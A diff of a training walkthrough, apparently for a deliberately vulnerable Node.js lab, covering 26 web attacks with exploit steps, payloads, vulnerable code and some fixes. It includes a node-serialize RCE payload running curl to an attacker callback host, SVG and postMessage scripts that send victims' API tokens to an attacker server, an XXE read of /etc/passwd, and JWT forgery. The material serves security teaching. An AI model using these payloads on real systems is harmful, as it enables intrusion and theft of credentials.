@@ -7,7 +7,7 @@
   - [Exploit](#exploit)
   - [Vulnerable Code](#vulnerable-code)
   - [Fix](#fix)
-- [2. Insecure Deserialisation](#2-insecure-deserialisation)
+- [2. Insecure Deserialization](#2-insecure-deserialization)
   - [Exploit](#exploit-1)
   - [Vulnerable code](#vulnerable-code-1)
   - [Fix](#fix-1)
@@ -40,61 +40,62 @@
   - [Vulnerable Code](#vulnerable-code-8)
 - [11. postMessage CSRF](#11-postmessage-csrf)
   - [Exploit](#exploit-9)
-  - [Vulnearble Code](#vulnearble-code)
+  - [Vulnerable Code](#vulnerable-code-9)
 - [12 Information Disclosure using addEventListener](#12-information-disclosure-using-addeventlistener)
   - [Exploit](#exploit-10)
-  - [Vulnerable code:](#vulnerable-code-9)
+  - [Vulnerable code:](#vulnerable-code-10)
 - [13 CORS Information Disclosure](#13-cors-information-disclosure)
   - [Exploit:](#exploit-11)
-  - [Vulnerable Code](#vulnerable-code-10)
+  - [Vulnerable Code](#vulnerable-code-11)
 - [14 CORS CSRF](#14-cors-csrf)
   - [Exploit:](#exploit-12)
-  - [Vulnerable Code](#vulnerable-code-11)
+  - [Vulnerable Code](#vulnerable-code-12)
 - [15 Insecure 2FA implementation.](#15-insecure-2fa-implementation)
   - [Exploit:](#exploit-13)
 - [16. Cross-Site WebSocket Hijacking](#16-cross-site-websocket-hijacking)
   - [Exploit](#exploit-14)
-  - [Vulnerable Code](#vulnerable-code-12)
+  - [Vulnerable Code](#vulnerable-code-13)
+  - [Fix](#fix-4)
 - [17 WebSocket XSS](#17-websocket-xss)
   - [Exploit](#exploit-15)
-  - [Vulnerable code](#vulnerable-code-13)
+  - [Vulnerable code](#vulnerable-code-14)
 - [18 ReactJS XSS](#18-reactjs-xss)
   - [Exploit](#exploit-16)
-  - [Vulnerable Code](#vulnerable-code-14)
+  - [Vulnerable Code](#vulnerable-code-15)
 - [19. React ref-innerHTML XSS](#19-react-ref-innerhtml-xss)
   - [Exploit](#exploit-17)
-  - [Vulnerable code](#vulnerable-code-15)
+  - [Vulnerable code](#vulnerable-code-16)
 - [20. NoSQL Injection](#20-nosql-injection)
   - [Exploit](#exploit-18)
-  - [Vulnerable code](#vulnerable-code-16)
+  - [Vulnerable code](#vulnerable-code-17)
 - [21. GraphQL Information Disclosure](#21-graphql-information-disclosure)
   - [Exploit](#exploit-19)
-  - [Vulnerable Code](#vulnerable-code-17)
+  - [Vulnerable Code](#vulnerable-code-18)
 - [22. GraphQL SQLi](#22-graphql-sqli)
   - [Exploit](#exploit-20)
-  - [Vulnerable code:](#vulnerable-code-18)
+  - [Vulnerable code:](#vulnerable-code-19)
 - [23. GraphQL CSRF](#23-graphql-csrf)
   - [Exploit](#exploit-21)
-  - [Vulnearble code](#vulnearble-code-1)
+  - [Vulnerable code](#vulnerable-code-20)
 - [24. GraphQL IDOR](#24-graphql-idor)
   - [Exploit](#exploit-22)
-  - [Vulnerable code](#vulnerable-code-19)
+  - [Vulnerable code](#vulnerable-code-21)
 - [25 XSS using SVG file upload](#25-xss-using-svg-file-upload)
   - [Exploit](#exploit-23)
-  - [Vulnerable Code](#vulnerable-code-20)
+  - [Vulnerable Code](#vulnerable-code-22)
 - [26 JSONP Injection](#26-jsonp-injection)
   - [Exploit](#exploit-24)
-  - [Vulnerable Code](#vulnerable-code-21)
+  - [Vulnerable Code](#vulnerable-code-23)
 
 <div class="page-break"></div>
 
 ## 1. Command Injection 
 
-Application is using **child_process.exec()** method to run ping on user supplied input your goal is to acheive the RCE.
+Application is using **child_process.exec()** method to run ping on user supplied input your goal is to achieve the RCE.
 
 ### Exploit
 
-Application is concatinating user supplied input to ping command without any sanitization and executing it using the **exec** method that can lead to RCE if malicious input is provided, following payload will execute the whoami command on the server after running ping.
+Application is adding user supplied input to ping command without any sanitization and executing it using **exec** method that can lead to RCE if malicious input is provided, following payload will execute the whoami command on the server after running ping.
 
 ```bash
 google.com; whoami
@@ -129,11 +130,11 @@ const ping_post = (req, res) => {
 
 ### Fix
 
-Use child_process package method **execFile**  that starts a specific program and takes an array of arguments.
+Use child_process package method **execFile** that starts a specific program and takes an array of arguments.
 
-## 2. Insecure Deserialisation
+## 2. Insecure Deserialization
 
-Application is parsing the preference cookie using node-serialize module function **unserialize** that has a known RCE vulnerabilty. 
+Application is using node-serialize method unserialize to parse the preference cookie, your goal is to acheive the RCE. 
 
 ### Exploit
 
@@ -158,17 +159,14 @@ Save the above code in a file and run it you will get the serialized payload.
 {"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}"}
 ```
 
-Now we have a serialized payload that can be deserialized using unserialize() function but the code will not execute until we trigger the function corresponding to the `payload` property to do that we can
-use Immediately invoked function expression for calling the function by adding `()` after the
-function so our final payload will look like this:
+Now we have a serialized payload that can be deserialized using unserialize() function but the code will not execute until we trigger the function corresponding to the `payload` property to do that we can use the immediately invoked function expression for calling the function by adding `()` after the function, our final payload will look like this:
 
 ```json
 {"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('curl yourwebsite.com', function(error, stdout, stderr){console.log(stdout)})}()"}
 
 ```
 
-Now replace this payload value with preference cookie value in `/save-preference` POST request and you
-will receive a callbak request on your attacker server.
+Now replace this payload value with the preference cookie value in `/save-preference` POST request and you will receive a callback request on your attacker server.
 
 **Reference:** https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
 
@@ -202,7 +200,7 @@ Do not use unserialize function on untrusted input.
 
 ## 3. JWT weak secret
 
-Application is using  weak secret to create JSON web token that can lead to authentication bypass. Your goal is to access the API Key of user **`vulnlabAdmin`**. 
+Application is using the weak secret to create JSON web token that can lead to authentication bypass, your goal is to access the API Key of user **`vulnlabAdmin`**.
 
 ### Exploit
 
@@ -216,14 +214,14 @@ Application is using  weak secret to create JSON web token that can lead to auth
 $ john authToken.txt
 ```
 
-4. Understand the jwt token structure to create the valid token.
+4. Understand the JWT token structure to create a valid token.
    
 ```bash
 # base64 decoded jwt token
 {"alg":"HS256","typ":"JWT"}{"username":"vulnlabAdmin","iat":1646548200}�S�;�w������Θ�����FǪ��:�
 ```
 
-5. It is using `HS256` algorithm to sign the payload and in payload it has username that is used to identify the user 
+5.  Application is using the `HS256` algorithm to sign the payload and in the payload it has a username that it is for identifying the user.
 
 6. Use the secret to create a valid JWT for user **`vulnlabAdmin`** using **`jsonwebtoken`** package. 
 
@@ -240,7 +238,7 @@ $ node jwt.js
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZ1bG5sYWJBZG1pbiIsImlhdCI6MTY0NjU0OTIyMn0.jntBGk0Dw7hiX81yo3-9afj0djZ3f-o5P0UapJbVCW
 ```
 
-5. Now that we have a valid JWT for user **`vulnlabAdmin`** we can use it in **`authToken`** cookie value to access the API token of **`vulnlabAdmin`** user and complete the exercise.
+5. Now that we have a valid JWT for user **`vulnlabAdmin`** we can use it in **`authToken`** cookie value to access the API token of **`vulnlabAdmin`** user and complete this exercise.
 
 
 ### Vulnerable Code
@@ -262,8 +260,7 @@ Use strong secret to generate JWT
 
 ## 4. IDOR 
 
-Application is loading Notes saved in the user account based on the userid supplied in url path your
-goal is to access notes saved in **`vulnlabAdmin`** user account by performing IDOR.
+Application is loading Notes saved in a user account based on userid supplied in the URL path your goal is to access notes saved in **`vulnlabAdmin`** user account by performing IDOR.
 
 **Request method & endpoint**
 
@@ -273,8 +270,8 @@ endpoint: /notes/user/:userid
 ```
 ### Exploit
 
-1. Go to **`/notes`** and create a note while intercepting request using burpsuite.
-2. Forward the note saving request and you will see another request to **`/notes/user/:userid`** to load your notes send this request to repeater and guess the userid of user **`vulnlabAdmin`** to access his notes and complete this exercise.
+1. Go to **`/notes`** and create a note while intercepting request using burp suite.
+2. Forward the note saving request and you will see another request to **`/notes/user/:userid`** to load your notes send this request to the repeater and guess the userid of user **`vulnlabAdmin`** to access his notes.
 
 
 ### Vulnerable Code
@@ -314,7 +311,7 @@ const userNotes_get = (req, res) => {
 
 ## 5. XSS
 
-Three different XSS cases are covered in this exercise depending on the template sanitization and context.
+Three different XSS cases are covered in this exercise depending on the <code>ejs</code> template syntax used to display user supplied input and context.
 
 **Route: /routes/app.js**
 
@@ -365,8 +362,7 @@ var number = <%= xss2 %>;
 <% }%>
 ```
 
-In this case application is rendering user supplied input using ejs escape output syntax (<%= xss2 %>) which escapes special characters but the reflection is happening inside the script tag so an attacker
-can execute the XSS attack without using the special characters.
+In this case, the application is rendering user supplied input using ejs escape output syntax (<%= xss2 %>) which escapes special characters but the reflection is happening inside the script tag so an attacker can execute the XSS attack without using the special characters.
 
 ### Case 3: XSS inside JSON object
 
@@ -381,18 +377,16 @@ var b = <%- JSON.stringify({"username": xss3})%>;
 <% }%>
 ```
 
-Here application is using `<%-JSON.stringify("{username": xss3})%>` to create a json object with user supplied input it uses ejs raw output syntax `<%-` to create a valid json object it does not use `<%=` because it will also encode the double quotes but JSON.stringify will escape double quotes that means we have to find a way to break out of the double quote to do that we will use this payload `</script><script>alert(1)</script>`
+In this case, the application is using `<%-JSON.stringify("{username": xss3})%>` to create JSON object with user supplied input it is using ejs raw output syntax `<%-` to create a valid JSON object it does not use `<%=` output syntax because it will also encode the double quotes but JSON.stringify will escape double quotes that means we have to find a way to break out of the double quote to do that we will use this payload `</script><script>alert(1)</script>`.
 
 ## 6. SSTI
 
-Application is directly concatinating user supplied input into a template rather then
-passing it as a data this allows attackers to execute arbitrary code on the server. Your goal is to steal the database credentials from environment variables.
-
+Application is directly concatenating user supplied input to the template that can lead to SSTI your goal is to steal the database credentials.
 
 ### Exploit
 
 1. Go to **`/ssti?path=helloworld`**.
-2. You will notice that `helloworld` is displayed in the response, now try ssti polygot payload `${{<%25[%25'"}}%25\.` in the path parameter you will get the following message in the first line of error which suggests that template engine uses `<%, %>` for opening and closing tag one such template engine is ejs.
+2. You will notice that `helloworld` is displayed in the response, now try ssti polyglot payload `${{<%25[%25'"}}%25\.` in the path parameter you will get the following error message which suggests that template engine uses `<%, %>` for opening and closing tag one such template engine is ejs.
    ```
    Error: Could not find matching close tag for "<%".
    ```
@@ -447,8 +441,8 @@ Application is concatenating user supplied input to SQL query without any valida
 
 ### Exploit
 
-1. Go to `/sqli` and select station from list and click on **check** while intercepting request using burpsuite.
-2. Add `'` at the end of URL path you will see the SQL error from here you can proceed to get database details.
+1. Go to `/sqli` and select station from list and click on **check** while intercepting request using burp suite.
+2. Add `'` at the end of the URL path you will see the SQL error from here you can proceed to get database details.
 
 <div class="page-break"></div>
 
@@ -480,13 +474,13 @@ const sqli_check_train_get = (req, res) => {
 
 ## 8. XXE
 
-Application is using libxmljs to parse xml input but noent flag is set to true which enables external
-entities parsing. your goal is to read `/etc/passwd` file.
+Application is using `libxmljs` to parse XML input but `noent` flag is set to true which enables external entities parsing. your goal is to read `/etc/passwd` file.
 
 ### Exploit
 
-* Go to `/xxe` and in the comment section add the following payload to read `/etc/passwd` file.
-
+1. Go to `/xxe` and add a random comment while intercepting requests using burp suite.
+2. Change the comment parameter value with the following payload to read `/etc/passwd` file.
+   
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE asdf [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
@@ -518,12 +512,11 @@ const xxe_comment = (req, res) => {
 
 ## 9. SSRF via PDF generator
 
-Application is using html-pdf-node package to generate ticket pdf which takes HTML page as an input and generates the PDF but application is not sanitizing user input before generating the HTML page an attacker can use it to perform the SSRF.
+Application is using html-pdf-node package to generate ticket PDF which takes HTML page as an input and generates the PDF but application is not sanitizing user input before generating the HTML page an attacker can use it to perform the SSRF.
 
 ### Exploit
 
-Inject the following payload in the passenger name field to perform the SSRF, change yourwebsite.com
-to your web server to receive callback to confirm the SSRF.
+Inject the following payload in the passenger name field to perform the SSRF and don't forget to change yourwebsite.com to your webserver to receive a callback
 
 ```
 <iframe src="http://yourwebsite.com/asdf"/>
@@ -551,17 +544,16 @@ const ticket_booking_get = (req, res) => {
 }
 ```
 
-Application is receving ticket details from the user then using it to generate HTML page by using html-pdf-node package function generatePdf that takes url as a input and generates the PDF from the
-received response.
+Application is receiving ticket details from the user and then using it to generate HTML page by using html-pdf-node package function generatePdf that takes URL as an input and generates the PDF from the received response.
 
 
 ## 10. postMessage XSS
 
-User edit page has a `addEventListener()` call that listens for the web message and inserts that message to a `<div>` without verifying the origin from where it received the message. 
+The user edit page has an `addEventListener()` call that listens for the web message and inserts that message to a `<div>` without verifying the origin from where it received the message.
 
 ### Exploit
 
-Create a HTML page with following code and host it on your server to perform the XSS
+Create an HTML page with the following code and host it on your server to perform the XSS
 
 ```html
 <html>
@@ -590,14 +582,14 @@ window.addEventListener("message", function(event){
 
 ## 11. postMessage CSRF
 
-Organization Management page has a functionality to add user in the org when org owner clicks on the `Add Users` button it opens a new popup window then the org owner selects a user from the list and clicks on the `Add` button this button posts a message using `postMessage()` to the tab which opened it then the opener tab receives the selected username using `addEventListener()` and sends the HTTP request to add that user in the org. Here opener tab does not verifies the origin from which it received the message which means any origin can send a arbitrary username using `postMessage()` and that username will be added to the organisation.
+Organization Management page has a functionality to add users to the organization when the org owner clicks on the `Add Users` button it opens a new popup window then the org owner selects a user from the list and clicks on the `Add` button this button posts a message using `postMessage()` to the tab which opened it then the opener tab receives the selected username using `addEventListener()` and sends the HTTP request to add that user in the org. Here opener tab does not verify the origin from which it received the message which means any origin can send an arbitrary username using `postMessage()` and that username will be added to the organization.
 
 ### Exploit
 
 
-1. First create a organization in victim account.
+1. First create an organization in the victim account.
 2. Create a hacker account.
-3. Save the following code in a HTML file and replace the username with your hacker username and send that to victim user your hacker user will get added to the vicitm organization.
+3. Save the following code in an HTML file and replace the username with your hacker username and send that to the victim user your hacker user will get added to the victim organization.
 
 ```html
 <html>
@@ -612,7 +604,7 @@ Organization Management page has a functionality to add user in the org when org
 </html>
 ```
 
-### Vulnearble Code
+### Vulnerable Code
 
 **View: /views/organization.ejs**
 
@@ -635,11 +627,11 @@ window.addEventListener('message', function (event) {
 
 ## 12 Information Disclosure using addEventListener
 
-In this exercise you will learn how insecure use of `postMessage` can be used to steal the sensitive information, `api-token` has a button show when you click on it, it will open a new popup window which will fetch the user API token and send it to the opener window using postmessage, Since it sends the message to the opener window without specifically specifing the origin, An attacker domain which opens the `/api-token/show` will be able to receive the API token.
+In this exercise you will learn how insecure use of `postMessage` can be used to steal the sensitive information, `/api-token` page has a button to show your API Key, when you click on it, it will open a new popup window which will fetch the user API token and send it to the opener window using postmessage, Since it sends the message to the opener window without specifically specifying the origin, An attacker domain which opens the `/api-token/show` will be able to receive the API token.
 
 ### Exploit
 
-Save the following HTML code in a HTML file, host it on your server and send the link to victim and you will see a popup showing the victim API token to further exploit you can send the API token to your attacker server.
+Save the following HTML code in an HTML file, host it on your server and send the link to the victim you will see a popup showing the victim API token to further exploit you can send the API token to your attacker server.
 
 ```html
 <html>
@@ -668,11 +660,11 @@ Save the following HTML code in a HTML file, host it on your server and send the
 
 ## 13 CORS Information Disclosure
 
-`cors-api-token` endpoint is vulnerable to Cross Origin Resource Sharing your goal is to exploit it to steal victim user API Token.
+`cors-api-token` endpoint is vulnerable to Cross-Origin Resource Sharing your goal is to exploit it to steal victim user API Token.
 
 ### Exploit:
 
-1. Save the following HTML code in a HTML file.
+1. Save the following HTML code in an HTML file.
 
 ```
 <html>
@@ -699,8 +691,8 @@ document.addEventListener('readystatechange', ()=>{
 </html>
 ```
 
-2. Open the link in your victim browser and you will see a popup with user API token you can also transfer this API token to your attacker server.
-
+2. Open the link in your victim browser and you will see a popup with a user API token you can also transfer this API token to your attacker server.
+   
 ### Vulnerable Code
 
 **Request endpoint & method**
@@ -732,11 +724,11 @@ const cors_api_token_get = (req, res) => {
 
 ## 14 CORS CSRF
 
-`cors-csrf-edit-password` endpoint is used for updating password this endpoint only accepts content type `json` and it is not possible to send this content type without application allowing cross origin connection so we test for it and find out that endpoint is vulnerable to Cross Origin Resource Sharing we can exploit it to perform CSRF and change victim password.  
+`cors-csrf-edit-password` endpoint is used for updating password this endpoint only accepts content type `application/json` and it is not possible to send this content type without application allowing cross origin connection so we test for it and find out that endpoint is vulnerable to Cross Origin Resource Sharing we can exploit it to perform CSRF and change victim password.  
 
 ### Exploit:
 
-1. Host the following code in a HTML file on your attacker server.
+1. Host the following code in an HTML file on your attacker server.  
 
 ```html
 <html>
@@ -763,8 +755,8 @@ document.addEventListener('readystatechange', ()=>{
 </html>
 ```
 
-1. Open the HTML file in victim browser and you will see a popup "Password update Successfull!".
-
+2. Open the HTML file in the victim browser and you will see a popup "Password update Successful!".
+   
 ### Vulnerable Code
 
 **Request endpoint, method, content-type**
@@ -809,7 +801,7 @@ const cors_csrf_edit_password_post = (req, res) => {
     if (req.body.password == '' || req.body.password == undefined || req.body.password == null) return res.sendStatus('400');
     Users.update({ password: md5(req.body.password) }, { where: { username: req.user.username } })
         .then((queryResults) => {
-            res.send("Password update Successfull!");
+            res.send("Password update Successful!");
         })
         .catch((err) => {
             res.send('Unexpected error occured');
@@ -818,21 +810,21 @@ const cors_csrf_edit_password_post = (req, res) => {
 ```
 ## 15 Insecure 2FA implementation.
 
-Application has implemented 2FA insecurely it presents 2FA page after login if user have enabled it but an attacker can bypass it by force browsing.
+Application has implemented 2FA insecurely it presents a 2FA page after login if users have enabled it but an attacker can bypass it by forced browsing.
 
 ### Exploit:
 
 1. Setup 2FA on your victim account logout from the account.
-2. As an attacker login to victim account you will see the 2FA page but you can easily bypass it by using forced browsing technique.
+2. As an attacker login to the victim's account you will see the 2FA page but you can easily bypass it by using the forced browsing technique.
 
 ## 16. Cross-Site WebSocket Hijacking
 
-Application is using old version of socket.io which by default enables CORS your goal is to exploit it to access wallet information of victim user.
+Application is using an old version of socket.io which by default enables CORS your goal is to exploit it to access the wallet information of the victim user.
 
 ### Exploit
 
-1. Save the following code in a HTML file on your server.
-
+1. Save the following code in an HTML file on your server.
+   
 ```html
 <html>
 <head>
@@ -854,11 +846,9 @@ window.onload = function(){
 </html>
 ```
 
-2. Open the html file on your victim browser and you will see an alert showing the wallet information of the victim user.
-
+2. Open the HTML file on your victim browser and you will see an alert showing the wallet information of the victim user.
+   
 ### Vulnerable Code
-
-Use the latest version of socket.io package to fix the issue as the version used in the application by default enables the CORS.
 
 **/package.json**
 
@@ -866,15 +856,19 @@ Use the latest version of socket.io package to fix the issue as the version used
     "socket.io": "2.3.0",
 ```
 
+### Fix
+
+Use the latest version of the socket.io package to fix the issue as the version used in the application by default enables the CORS.
+
 ## 17 WebSocket XSS
 
-Application is using socket.io for real time chat but has only implemented client side input sanitization which can be bypassed by intercepting the request before it goes to the server.
+Application is using socket.io for real-time chat but has only implemented client-side input sanitization which can be bypassed by intercepting the request before it goes to the server.
 
 ### Exploit
 
-1. Create two account victim & hacker.
-2. In first browser login as victim.
-3. In second browser login as hacker go to `/websocket-xss` send a message while intercepting it using burpsuite edit message value to perform XSS.
+1. Create two accounts victim & hacker.
+2. In the first browser login as a victim.
+3. In the second browser login as hacker go to `/websocket-xss` and send a message while intercepting it using burp suite edit message value to perform XSS.
    
 ### Vulnerable code
 
@@ -901,20 +895,17 @@ Application is using socket.io for real time chat but has only implemented clien
 
 ## 18 ReactJS XSS
 
-Application is using ReactJS which provides by default protection from XSS attacks by encoding dangerous characters before appending it to the page but there are cases when it will not protect from XSS attacks, for example: when application passes user supplied input to href attribute.
+Application is using ReactJS which provides by default protection from XSS attacks by encoding dangerous characters before appending it to the page but there are cases when it will not protect from XSS attacks, for example: when the application passes user-supplied input to `href` attribute.
 
 ### Exploit
 
-application is taking user supplied website url and passing it to anchor tag href attribute.
+Application is taking user-supplied website URL and passing it to anchor tag href attribute.
 
-1. Go to `/react-href-xss` and inject following payload in the website input field and once a user clicks on the url they will see a popup.
-  
-```js
-javascript:alert(1)
-```
+1. Go to `/react-href-xss` and inject the following payload in the website input field and once a user clicks on the URL they will see a popup.
 
-2. But currently this is a self XSS to attack other users we have to find a way to update other users profile which can be acheived by performing CSRF as the server also accepts `application/x-www-form-urlencoding` content-type.
+```jsjavascript:alert(1)```
 
+2. But currently this is a self XSS to attack other users we have to find a way to update other users' profiles which can be achieved by performing CSRF as the server also accepts `application/x-www-form-urlencoding` content-type.
 
 ### Vulnerable Code
 
@@ -960,18 +951,18 @@ const react_xss_post = (req, res) => {
 
 ## 19. React ref-innerHTML XSS
 
-ReactJS provides escape hatch to provide direct access to DOM elements. With direct access application can perform the desired operation, without requiring explicit support from React. There are two escape hatches provided by ReactJS which give access to native DOM elements: findDOMNode and createRef. In this exercise application is using refs with innerHTML property to display user supplied input which makes it vulnerable to XSS.
+ReactJS provides an escape hatch to provide direct access to DOM elements. With direct access application can perform the desired operation, without requiring explicit support from React. There are two escape hatches provided by ReactJS which give access to native DOM elements: findDOMNode and createRef. In this exercise, the application is using refs with innerHTML property to display user-supplied input which makes it vulnerable to XSS.
 
 
 ### Exploit
 
-1. Inject the following payload in name, email & website field to confirm the XSS.
-
+1. Inject the following payload in the name, email & website field to confirm the XSS.
+   
 ```
 <img src=X onerror=alert(1)>
 ```
 
-2. Use the CSRF to steal other users cookie.
+2. Chain this bug with CSRF to steal other users cookie.
 
 ### Vulnerable code
 
@@ -1005,11 +996,11 @@ const react_xss_post = (req, res) => {
 
 ## 20. NoSQL Injection
 
-Application is using mongodb to handle user notes your goal is to read a note with the title SuperSecretNote by performing NoSQL injection. 
+Application is using MongoDB to handle user notes your goal is to read a note with the title SuperSecretNote by performing NoSQL injection. 
 
 ### Exploit
 
-1. Go to `/mongodb-notes` save a note while intercepting request using burpsuite forward this request then you will see one more request to `/mongodb-notes/show-notes`.
+1. Go to `/mongodb-notes` save a note while intercepting request using burp suite forward this request then you will see one more request to `/mongodb-notes/show-notes`.
 2. Now perform the NoSQLi to see all notes saved in the database by using following payload.
 
 ```json
@@ -1056,20 +1047,19 @@ Application is using GraphQL your goal is to disclose the information of other r
 
 ### Exploit
 
-If an application is using graphql and introspection query is not disabled we can find out all the query and see if any query is available that can leak sensitive information. 
+If an application is using graphql and the introspection query is not disabled we can find out all the queries and see if any query is available that can leak sensitive information.
 
-1. Go to graphql endpoint `graphql`
-2. Refresh the page while intercepting request using burpsuite transfer the request to repeater change the request method to POST and content-type to `application/json` and use the following introspection query in the body.
+1. Go to graphql endpoint `/graphql`.
+2. Refresh the page while intercepting request using burp suite transfer the request to repeater change the request method to POST and content-type to `application/json` and use the following introspection query in the body.
 
 ```json
 {"query": "query IntrospectionQuery {__schema {queryType { name }         mutationType { name } subscriptionType { name } types {...FullType}directives {name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name         description args { ...InputValue } type { ...TypeRef } isDeprecated         deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef }       enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name           ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"}
 ```
 
-1. Copy the respose and go to `https://apis.guru/graphql-voyager/` website click on change schema button switch to introspection tab and paste the introspection query response click on display and you will have a complete query map.
+3. Copy the response and go to `https://apis.guru/graphql-voyager/` website click on the change schema button switch to the introspection tab and paste the introspection query response click on display and you will have a complete query map.
+4. In Query type you will see a `listUsers` query that returns a list of users, we will use this query to list all the users registered in the application.
+5. Go back to the burp repeater tab and replace the introspection query with the following query, click on go and you will get the username & email of all registered users.
 
-2. In Query type you will see a `listUsers` query that returns a list of users, we will use this query to list all the users registered in the application.
-
-3. Go back to burp repeater tab and replace the introspection query with the following query, click on go and you will get username & email of all registered users.
 
 ```json
 {"query": "query {listUsers{username email}}"}
@@ -1088,7 +1078,7 @@ router.use('/graphql', authenticateToken, graphqlHTTP({
 }))
 ```
 
-2. Lack authorization check on sensitive endpoint.
+2. Lack of authorization check on the sensitive endpoint.
  
 ```js
 const graphqlroot = {
@@ -1111,12 +1101,12 @@ async function graphql_AllUsers(){
 
 ## 22. GraphQL SQLi
 
-Application is trusting data supplied from the client and using it to in a sql query without proper sanitization to display user profile your goal is to perform SQL injection.
+Application is trusting data supplied from the client and using it in a SQL query without proper sanitization to display the user profile your goal is to perform SQL injection.
 
 ### Exploit
 
 1. Go to `/graphql-user-profile`
-2. Referesh the page while intercepting using burpsuite, you will see a graphql request to `user` transfer it to repeater.
+2. Refresh the page while intercepting using burp suite, you will see a graphql request to `user` transfer it to the repeater.
 3. Use the following payload in the username variable value to confirm SQLi.
 
 ```
@@ -1169,26 +1159,26 @@ Application is using graphql to update user information, your goal is to change 
 
 ### Exploit
 
-`express-graphql` interpret request body depending upon the *Content-Type* header, that means we can perform the CSRF attack using `application/x-www-form-urlencoded` content-type or we can also perform CSRF by supplying query in GET parameter instead of using POST request.
+`express-graphql` interpret request body depending upon the *Content-Type* header, which means we can perform the CSRF attack using `application/x-www-form-urlencoded` content-type or we can also perform CSRF by supplying query in GET parameter instead of using a POST request.
 
-CSRF via POST request using `appilication/x-www-form-urlencoded` content-type
+CSRF via POST request using `appilication/x-www-form-urlencoded` content-type.
 
 1. Go to `graphql-update-profile`.
-2. Change password while intercepting request using burpsuite you will see graphQL password update request body.
-
+2. Change password while intercepting request using burp suite you will see graphQL password update request body.
+   
 ```
 {"query":"mutation { updateProfile(username: \"hacker\", email: \"hacker@gmail.com\", password: \"hacked\")}","variables":null}
 ```
 
-3. Change the content-type of request to `application/x-www-form-urlencoded` and also the request body with following. 
+3. Change the content-type of request to `application/x-www-form-urlencoded` and also the request body with the following.
 
 ```
 query=mutation { updateProfile(username: "hacker", email: "hacker@gmail.com", password: "hacked")}&variables=null
 ```
 
-4. Send the request and you will see `Update Successfull!` which shows that application also accepts `application/x-www-form-urlencoded` data now you can create a CSRF exploit page and send it to victim to change their email & password.
+4. Send the request and you will see `Update Successful!` which shows that the application also accepts `application/x-www-form-urlencoded` data now you can create a CSRF exploit page and send it to the victim to change their email & password.
 
-### Vulnearble code
+### Vulnerable code
 
 **Route: /routes/app.js**
 
@@ -1218,18 +1208,18 @@ async function graphql_UpdateProfile(args, req){
     await con.connect()
     const updateResult = await con.promise().query(updateQuery)
     const updateStatus = JSON.stringify(updateResult[0].affectedRows) // returns update status
-    return "Update Successfull!"
+    return "Update Successful!"
 }
 ```
 
 ## 24. GraphQL IDOR
 
-Application is trusting data supplied from the API client and using it to show the user details without performing the authorization check, your goal is to access details of other users by perfrom IDOR.
+Application is trusting data supplied from the API client and using it to show the user details without performing the authorization check, your goal is to access details of other users by performing IDOR.
 
 ### Exploit
 
 1. Go to `/graphql-idor-show-profile`.
-2. Referesh the page while intercepting request using burpsuite, you will see a graphql request to show user profile send that request to repeater and change the value of variable userid to `1` and you will be able to see the details of admin user `vulnlabAdmin`.
+2. Refresh the page while intercepting requests using burp suite, you will see a graphql request to show the user profile send that request to the repeater and change the value of variable userid to `1` and you will be able to see the details of admin user `vulnlabAdmin`
     
 ### Vulnerable code
 
@@ -1267,12 +1257,12 @@ async function graphql_ShowProfile(args){
 
 ## 25 XSS using SVG file upload
 
-Application allow users to upload .svg file as a profile picture your goal is to steal other users information by using XSS. 
+Application allows users to upload .svg file as a profile picture your goal is to steal other user information by using XSS.
 
 ### Exploit
 
-1. Login to attacker acccount
-2. Upload the following malicious .svg file in your account.
+1. Login to the attacker account
+2. Upload the following malicious `.svg` file to your account.
    
 ```
 <?xml version="1.0" standalone="no"?>
@@ -1285,8 +1275,8 @@ Application allow users to upload .svg file as a profile picture your goal is to
    </script>
 </svg>
 ```
-3. Right click on your profile image click on view image and it will open the image in new tab and you will see an alert popup.
-4. Now modify the XSS payload in the svg file to steal details from other users acccount such as there API token that is returned from this endpoint `/jwt1/apiKey`
+3. Right click on your profile image click on view image and it will open the image in a new tab and you will see an alert popup.
+4. Now modify the XSS payload in the svg file to steal details from other users account such as their  API token that is returned from this endpoint `/jwt1/apiKey`
    
 ```xml
 <?xml version="1.0" standalone="no"?>
@@ -1305,7 +1295,7 @@ stealData("http://<vuln-nodejs-app>/jwt1/apiKey");
 </svg>
 ```
 
-5. Save the above code in .svg file and upload it as your profile picture then copy the file url and send it your target and you will get apikey in your attacker server logs.
+5. Save the above code in a .svg file and upload it as your profile picture then copy the file URL and send it to your target and you will get apikey in your attacker server logs.
 
 ### Vulnerable Code
 
@@ -1336,16 +1326,16 @@ const svg_xss_fileupload_post = (req, res) => {
 
 ## 26 JSONP Injection
 
-Application is using JSONP for fetching wallet balance information your goal is to steal wallet information of other users. 
+Application is using JSONP for fetching wallet balance information your goal is to steal the wallet information of other users.
 
 ### Exploit
 
-1. First go to `/jsonp-injection` and analyze how browser is fetching latest wallet ballance using burpsuite.
-2. You will notice a callback parameter which contains callback function name and also the response type is application/javascript because it is JSONP endpoint
-3. Now send the request without callback parameter this time you will notice that server returned application/json content-type so if you are doing testing dont't forget to add '?callback' parameter in the request url to check if target api provides jsonp response.
-4. Since jsonp endpoint returns content-type application/javascript and allow us to specify callback funciton we can steal user information, by using jsonp endpoint as a script in our attacker website then sending it to victim to steal their information.
-5. Copy the following code in a HTML file and host it on your server.
-
+1. First go to `/jsonp-injection` and analyze how the application is updating wallet balance information using burp suite.
+2. Observe a GET request going to `/jsonp-injection/wallet-usd-balance` endpoint with a callback parameter. 
+3. Forward the request and observe that the response type is application/javascript because it is a JSONP endpoint.
+4. Now send the request without callback parameter this time you will notice that server returned application/json content type so if you are doing testing don't forget to add '?callback' parameter on API endpoints to check if the target api provides jsonp response.
